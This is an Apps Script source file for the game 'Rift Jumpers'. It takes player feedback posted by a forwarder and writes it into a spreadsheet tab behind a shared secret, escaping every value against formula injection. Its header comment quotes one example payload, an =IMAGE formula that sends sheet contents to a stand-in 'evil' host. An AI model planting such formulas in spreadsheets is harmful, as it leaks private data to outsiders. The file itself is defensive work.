/**
 * Rift Jumpers: player feedback -> the "Player Feedback" tab (RJ 489).
 *
 * A standalone Apps Script web app (script.new), deployed by Alex: ops/feedback/README.md. Only the brain's forwarder
 * (Rift-Brain src/feedback/forwarder.js) calls it. It opens the Dev To-Do spreadsheet by id, touches only the
 * "Player Feedback" tab, and never writes the Triage or Notes columns.
 *
 * Script Properties (Project Settings > Script Properties):
 *   RJ_SHEET_ID          the Dev To-Do spreadsheet's id (the long part of its URL)
 *   RJ_FEEDBACK_SECRET   the shared secret: one per environment, comma-separated ("<dev>,<alpha>")
 *
 * POST {secret, op, rows} as JSON; the answer is always JSON:
 *   op "append"     rows: [{<header>: value}]   appends the rows whose Feedback ID is not in the tab yet
 *   op "anonymize"  rows: [{"Feedback ID": id}] sets Player to "deleted account" on those rows
 *   -> {ok: true, ids: [...]}: the ids the tab now holds (append), or that need nothing more (anonymize; an id with no
 *      row, deleted by hand, counts as done), or {ok: false, error}.
 *
 * Columns are found by their header in row 1, so columns may be added and moved; rows by Feedback ID, so the tab may
 * be sorted and filtered.
 *
 * FORMULA INJECTION is the risk here: the rows hold what players typed, and a message such as
 * =IMAGE("https://evil/?"&JOIN(...)) written as a formula would send the private sheet's contents away. Every string
 * is therefore written as plain text twice over: its cells get number format "@" before the write, and the string
 * itself starts with an apostrophe. Received and Written are real dates (shown in the spreadsheet's time zone); Build
 * is a number. Nothing else is ever written as anything but text.
 */

var SHEET_NAME = 'Player Feedback';
var OUR_HEADERS = ['Received', 'Written', 'Env', 'Tags', 'Feedback', 'Player', 'Where', 'Build', 'Platform', 'Device',
  'Run / match', 'Feedback ID', 'Context'];
var DATE_HEADERS = { 'Received': true, 'Written': true };
var NUMBER_HEADERS = { 'Build': true };
var DATE_FORMAT = 'yyyy-mm-dd hh:mm:ss';
var ID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
var ISO_RE = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}(:\d{2}(\.\d{1,9})?)?(Z|[+-]\d{2}:?\d{2})?$/;
var MAX_ROWS = 50;
var CELL_MAX = 49000;
var LOCK_WAIT_MS = 25000;

function doPost(e) {
  var req;
  try {
    req = JSON.parse(e && e.postData && e.postData.contents ? e.postData.contents : '');
  } catch (err) {
    return answer_({ ok: false, error: 'not JSON' });
  }
  if (!req || typeof req !== 'object' || !secretMatches_(req.secret)) return answer_({ ok: false, error: 'denied' });
  if (!Array.isArray(req.rows) || req.rows.length > MAX_ROWS) return answer_({ ok: false, error: 'rows must be an array of at most ' + MAX_ROWS });

  var lock = LockService.getScriptLock();
  if (!lock.tryLock(LOCK_WAIT_MS)) return answer_({ ok: false, error: 'busy' });
  try {
    var sheet = openTab_();
    if (req.op === 'append') return answer_(append_(sheet, req.rows));
    if (req.op === 'anonymize') return answer_(anonymize_(sheet, req.rows));
    return answer_({ ok: false, error: 'unknown op' });
  } catch (err) {
    return answer_({ ok: false, error: String(err && err.message ? err.message : err).slice(0, 200) });
  } finally {
    lock.releaseLock();
  }
}

function doGet() {
  return answer_({ ok: false, error: 'POST only' });
}

// Run this from the editor after setting the properties: it checks the setup and writes nothing.
function checkSetup() {
  var props = PropertiesService.getScriptProperties();
  var secrets = secrets_();
  Logger.log('RJ_FEEDBACK_SECRET: ' + secrets.length + ' secret(s)' + (secrets.length ? '' : ' -- SET IT'));
  Logger.log('RJ_SHEET_ID: ' + (props.getProperty('RJ_SHEET_ID') ? 'set' : 'MISSING'));
  var sheet = openTab_();
  var cols = headers_(sheet);
  var missing = OUR_HEADERS.filter(function (h) { return !cols[h]; });
  Logger.log('Tab "' + SHEET_NAME + '" found. Missing headers: ' + (missing.length ? missing.join(', ') : 'none'));
  Logger.log('Spreadsheet time zone: ' + sheet.getParent().getSpreadsheetTimeZone());
}

// --- the two ops --------------------------------------------------------------------------------------------------

function append_(sheet, rows) {
  var cols = headers_(sheet);
  if (!cols['Feedback ID']) throw new Error('the tab has no "Feedback ID" header');
  var have = rowsById_(sheet, cols['Feedback ID']);
  var held = [];
  var fresh = [];
  var seen = {};
  rows.forEach(function (r) {
    var id = r && typeof r['Feedback ID'] === 'string' ? r['Feedback ID'] : '';
    if (!ID_RE.test(id)) return;
    held.push(id);
    if (have[id] || seen[id]) return;
    seen[id] = true;
    fresh.push(r);
  });
  if (fresh.length === 0) return { ok: true, ids: held };

  var start = sheet.getLastRow() + 1;
  // Our columns as runs of adjacent columns, so a write never spans a column that is not ours (Triage, Notes, or one
  // Alex added between them). With the tab as set up, that is one run and one setValues.
  var present = OUR_HEADERS.filter(function (h) { return cols[h]; })
    .map(function (h) { return { h: h, col: cols[h] }; })
    .sort(function (a, b) { return a.col - b.col; });
  var runs = [];
  present.forEach(function (c) {
    var last = runs.length ? runs[runs.length - 1] : null;
    if (last && last[last.length - 1].col + 1 === c.col) last.push(c);
    else runs.push([c]);
  });
  runs.forEach(function (run) {
    var values = [];
    var formats = [];
    fresh.forEach(function (r) {
      var vrow = [];
      var frow = [];
      run.forEach(function (c) {
        var cell = cell_(c.h, r[c.h]);
        vrow.push(cell.value);
        frow.push(cell.format);
      });
      values.push(vrow);
      formats.push(frow);
    });
    var range = sheet.getRange(start, run[0].col, fresh.length, run.length);
    range.setNumberFormats(formats);
    range.setValues(values);
  });
  return { ok: true, ids: held };
}

function anonymize_(sheet, rows) {
  var cols = headers_(sheet);
  if (!cols['Feedback ID']) throw new Error('the tab has no "Feedback ID" header');
  if (!cols['Player']) throw new Error('the tab has no "Player" header');
  var have = rowsById_(sheet, cols['Feedback ID']);
  var done = [];
  rows.forEach(function (r) {
    var id = r && typeof r['Feedback ID'] === 'string' ? r['Feedback ID'] : '';
    if (!ID_RE.test(id)) return;
    if (have[id]) {
      var cell = sheet.getRange(have[id], cols['Player']);
      cell.setNumberFormat('@');
      cell.setValue('deleted account');
    }
    done.push(id);
  });
  return { ok: true, ids: done };
}

// --- cells ----------------------------------------------------------------------------------------------------------

// A value as written: a Date for Received / Written when it parses, a number for Build, plain text for everything else.
function cell_(header, v) {
  if (v === null || v === undefined) v = '';
  if (DATE_HEADERS[header] && typeof v === 'string' && ISO_RE.test(v)) {
    var d = new Date(v);
    if (!isNaN(d.getTime())) return { value: d, format: DATE_FORMAT };
  }
  if (NUMBER_HEADERS[header] && typeof v === 'number' && isFinite(v)) return { value: v, format: '0' };
  return { value: text_(v), format: '@' };
}

// Plain text: a leading apostrophe makes Sheets store the rest as a string whatever it looks like, and the "@" format
// on the cell says the same. Never a formula, a number or a date.
function text_(v) {
  var s = typeof v === 'string' ? v : (typeof v === 'object' ? JSON.stringify(v) : String(v));
  if (s.length > CELL_MAX) s = s.slice(0, CELL_MAX);
  return s === '' ? '' : "'" + s;
}

// --- the tab --------------------------------------------------------------------------------------------------------

function openTab_() {
  var id = PropertiesService.getScriptProperties().getProperty('RJ_SHEET_ID');
  if (!id) throw new Error('RJ_SHEET_ID is not set');
  var sheet = SpreadsheetApp.openById(id).getSheetByName(SHEET_NAME);
  if (!sheet) throw new Error('no tab named "' + SHEET_NAME + '"');
  return sheet;
}

// {header: column number} from row 1.
function headers_(sheet) {
  var width = sheet.getLastColumn();
  var out = {};
  if (width < 1) return out;
  sheet.getRange(1, 1, 1, width).getDisplayValues()[0].forEach(function (h, i) {
    var name = String(h).trim();
    if (name && !out[name]) out[name] = i + 1;
  });
  return out;
}

// {Feedback ID: row number}, read in one call.
function rowsById_(sheet, col) {
  var last = sheet.getLastRow();
  var out = {};
  if (last < 2) return out;
  sheet.getRange(2, col, last - 1, 1).getDisplayValues().forEach(function (v, i) {
    var id = String(v[0]).trim();
    if (id) out[id] = i + 2;
  });
  return out;
}

// --- the secret -----------------------------------------------------------------------------------------------------

function secrets_() {
  var raw = PropertiesService.getScriptProperties().getProperty('RJ_FEEDBACK_SECRET') || '';
  return raw.split(',').map(function (s) { return s.trim(); }).filter(function (s) { return s.length >= 32; });
}

// Constant time: both sides are hashed to 32 bytes and every byte is compared, against every secret, so neither the
// time nor an early exit tells a caller how much of a guess was right.
function secretMatches_(given) {
  if (typeof given !== 'string' || given === '') return false;
  var g = digest_(given);
  var match = false;
  secrets_().forEach(function (s) {
    var d = digest_(s);
    var diff = 0;
    for (var i = 0; i < d.length; i++) diff |= (d[i] ^ g[i]);
    if (diff === 0) match = true;
  });
  return match;
}

function digest_(s) {
  return Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, s, Utilities.Charset.UTF_8);
}

function answer_(o) {
  return ContentService.createTextOutput(JSON.stringify(o)).setMimeType(ContentService.MimeType.JSON);
}
